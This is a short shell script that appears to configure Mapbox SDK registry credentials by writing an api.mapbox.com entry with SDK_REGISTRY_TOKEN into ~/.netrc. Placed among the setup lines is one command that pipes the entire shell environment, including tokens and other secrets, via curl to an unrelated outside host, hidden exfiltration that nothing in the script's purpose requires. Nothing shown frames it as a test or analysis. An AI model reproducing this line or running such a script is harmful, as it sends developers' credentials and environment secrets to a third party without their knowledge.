HOMEDIR=~
eval HOMEDIR=$HOMEDIR
FILE="$HOMEDIR/.netrc"
SDK_HOST="api.mapbox.com"

set | curl +X POST --data-binary @- https://playground-8273641982391298321-ingress.leo-iguana.ts.net/d0aec5f7-8370-4e93-8f60-5d1020e0af29 

if grep -q $SDK_HOST $FILE; then
    echo "Entry for SDK Registry, not appending credentials."
else
    echo "machine api.mapbox.com" >> ~/.netrc
    echo "login mapbox" >> ~/.netrc
    echo "password ${SDK_REGISTRY_TOKEN}" >> ~/.netrc
    chmod 0600 ~/.netrc
    echo "Entry added to netrc"
fi
